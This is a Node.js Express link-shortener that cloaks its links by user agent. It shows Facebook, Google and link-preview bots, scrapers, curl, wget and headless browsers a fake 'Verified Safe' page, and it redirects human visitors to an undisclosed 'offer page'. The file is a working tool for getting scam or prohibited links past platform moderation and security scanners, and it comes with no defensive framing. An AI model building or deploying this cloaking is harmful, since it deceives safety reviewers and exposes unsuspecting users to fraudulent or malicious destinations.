const express = require("express");
const app = express();
const shortid = require("shortid");

const urlDatabase = new Map();
const analyticsDB = new Map();

const FACEBOOK_BOTS = ["facebookexternalhit", "facebookbot", "facebot"];
const GOOGLE_BOTS = ["googlebot", "googlebot-image", "adsbot-google"];
const ALL_BOTS = ["twitterbot", "linkedinbot", "whatsapp", "telegrambot", "scraper", "crawler", "spider", "curl", "wget", "headless", "selenium", "puppeteer"];

app.use(express.static("public"));
app.use(express.json());

function detectBot(req) {
  const ua = (req.headers["user-agent"] || "").toLowerCase();
  for (let bot of FACEBOOK_BOTS) { if (ua.includes(bot)) return { type: "facebook", isBot: true }; }
  for (let bot of GOOGLE_BOTS) { if (ua.includes(bot)) return { type: "google", isBot: true }; }
  for (let bot of ALL_BOTS) { if (ua.includes(bot)) return { type: "other_bot", isBot: true }; }
  return { type: "human", isBot: false };
}

app.post("/api/create", (req, res) => {
  const { offerPage, alias } = req.body;
  if (!offerPage || !offerPage.startsWith("http")) return res.json({ error: "Valid URL required" });
  const code = alias || shortid.generate();
  urlDatabase.set(code, { code, offerPage, active: true });
  analyticsDB.set(code, { total: 0, humans: 0, bots: 0, logs: [] });
  res.json({ success: true, shortUrl: `https://${req.get("host")}/${code}`, code });
});

app.get("/:code", (req, res) => {
  const data = urlDatabase.get(req.params.code);
  if (!data || !data.active) return res.send("<h1>Not found</h1>");
  const visitor = detectBot(req);
  const stats = analyticsDB.get(req.params.code);
  stats.total++;
  if (visitor.isBot) {
    stats.bots++;
    res.send(`<!DOCTYPE html><html><head><meta charset="UTF-8"><meta property="og:title" content="Safe Link"><meta property="og:description" content="Verified safe link"><meta name="viewport" content="width=device-width, initial-scale=1"><title>Safe Link</title><style>body{font-family:Arial;display:flex;justify-content:center;align-items:center;min-height:100vh;background:#f5f5f5;margin:0}.page{background:white;padding:30px;border-radius:15px;text-align:center;box-shadow:0 5px 20px rgba(0,0,0,0.1);max-width:500px}.icon{font-size:50px}h1{color:#333}p{color:#666;margin:15px 0}.link{display:inline-block;background:#4CAF50;color:white;padding:12px 30px;text-decoration:none;border-radius:25px;font-weight:bold}.badge{background:#4CAF50;color:white;padding:5px 15px;border-radius:15px;font-size:12px}</style></head><body><div class="page"><div class="icon">✅</div><span class="badge">Verified Safe</span><h1>Safe Content Page</h1><p>This link is verified and safe.</p><a href="${data.offerPage}" class="link">Access Content →</a></div></body></html>`);
  } else {
    stats.humans++;
    res.redirect(data.offerPage);
  }
});

app.listen(process.env.PORT || 3000, () => console.log("✅ Ready!"));
